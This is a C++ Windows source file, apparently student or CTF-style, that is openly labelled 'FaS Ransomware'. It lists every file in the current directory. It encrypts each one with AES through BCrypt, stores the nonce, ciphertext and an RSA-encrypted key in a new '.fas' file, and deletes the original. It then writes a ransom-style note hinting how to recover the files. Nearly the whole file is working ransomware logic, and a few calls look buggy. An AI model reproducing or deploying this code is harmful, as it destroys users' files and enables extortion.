#include "file.h"
#include "rsa.h"
#include "main.h"
#define keyLength 32
#define NonceLength 8


void ReadFileContents(const _TCHAR* filePath, BYTE*& fileContents, DWORD& fileSize) {
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        // 파일 크기 가져오기
        fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE) {
            fprintf(stderr, "File Size error (Error: %lu)\n", GetLastError());
            CloseHandle(hFile);
            return;
        }

        // 파일 내용을 담을 메모리 할당
        fileContents = new BYTE[fileSize];

        // 원본 파일 내용을 BYTE 배열로 읽어오기
        DWORD bytesRead;
        while (ReadFile(hFile, fileContents, fileSize, &bytesRead, NULL) && bytesRead > 0) {
            //printf("\n\nplainsize %s\n\n", fileContents);

        }

        CloseHandle(hFile);
    }
    else {
        fprintf(stderr, "open file error: %s (Error: %lu)\n", filePath, GetLastError());
    }

}

void CreateAndDeleteFile(const _TCHAR* originalFilePath) {
    HANDLE hOriginalFile = CreateFile(originalFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    BYTE* plaintext = nullptr;
    DWORD fileSize = 0;

    // 파일 내용을 BYTE 배열로 읽어오기
    ReadFileContents(originalFilePath, plaintext, fileSize);

    if (plaintext != nullptr) {
        // AES
        BCRYPT_ALG_HANDLE ALG_HANDLE = NULL;
        GET_ALG_AES_HANDLE(&ALG_HANDLE);
        AES_Enc_TEST(ALG_HANDLE, plaintext, fileSize);
        BCryptCloseAlgorithmProvider(ALG_HANDLE, 0);


        BYTE *newciphertext;
        newciphertext = new BYTE[ciphertextLength];
        printf("%d", ciphertextLength);

        memcpy(newciphertext, ciphertext, ciphertextLength);
        PRINT(newciphertext, ciphertextLength, PRINT_CIPHERTEXT);

        BYTE newnonce[8] = { 0, };
        memcpy(newnonce, copyNonce, 8);
        PRINT(newnonce, 8, PRINT_NONCE);


        BYTE copycipherkey[512] = { 0, };
        memcpy(copycipherkey, savecipherkey, cipherkeyLength);

        CloseHandle(hOriginalFile);



        _TCHAR newFilePath[MAX_PATH] = { 0, };
        _tcscat_s(newFilePath, originalFilePath);
        _tcscat_s(newFilePath, _T(".fas"));

        std::ofstream fasWriteFile(newFilePath, std::ios_base::out | std::ios_base::binary);
        for (int i = 0; i < NonceLength; i++) {
            fasWriteFile << newnonce[i];
        }

        for (int i = 0; i < ciphertextLength; i++) {
            fasWriteFile << newciphertext[i];
        }
        for (int i = 0; i < cipherkeyLength; i++) {
            fasWriteFile << copycipherkey[i];
        }
        fasWriteFile << "CBC100" << fileSize;

        fasWriteFile.close();

        free(ciphertext);
        printf("filesize : %d\n", fileSize);
        printf("dexfilesize :%d", ciphertextLength);
         //Delete the original file
        if (DeleteFile(originalFilePath)) {
            printf("Origin File Delete.\\n");
        }
        else {
            fprintf(stderr, "Origin File Delete Error %s (Error: %lu)\\n", originalFilePath, GetLastError());
        }

    }
    else {
        fprintf(stderr, "Origin File Read Error: %s (Error: %lu)\n", originalFilePath, GetLastError());
    }
}

void CreateKeyFile() {
        _TCHAR newFilePath[MAX_PATH] = { 0, };
        _tcscat_s(newFilePath, _T("FaS.txt"));
        
        std::ofstream fasWriteFile(newFilePath, std::ios_base::out | std::ios_base::binary);

        fasWriteFile << "This is FaS Ransomware\n";
        fasWriteFile << "Find Rsa Key in Code, Let's Decrypt aes Key\n";
        fasWriteFile << "use decrypted aes key to file decrypt, key point is FaS_2024";

        fasWriteFile.close();
}

void FileSetting(BYTE* Nonce, BYTE* AES256Key, PBYTE cipherkey, DWORD cipherkeyLength) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(_T("*.*"), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "File open error.\n";
        return;
    }

    NTSTATUS status = ReadFile(
        hFind,
        findFileData.cFileName,
        sizeof(findFileData.cFileName),
        0,
        NULL
    );

    if (!NT_SUCCESS(status))
    {
        printf("Error Code : %x \n readFile fail\n", status);
        return;
    }
    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            // 파일 이름 출력
            _tprintf(TEXT("file: %s\n"), findFileData.cFileName);
            _TCHAR filePath[MAX_PATH];
            _stprintf_s(filePath, _T("%s%s"), _T("."), findFileData.cFileName);
            CreateAndDeleteFile(findFileData.cFileName);
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    CreateKeyFile();
    FindClose(hFind);
}
// // ===============================================================================
// READ FILE FINISH
// ===============================================================================
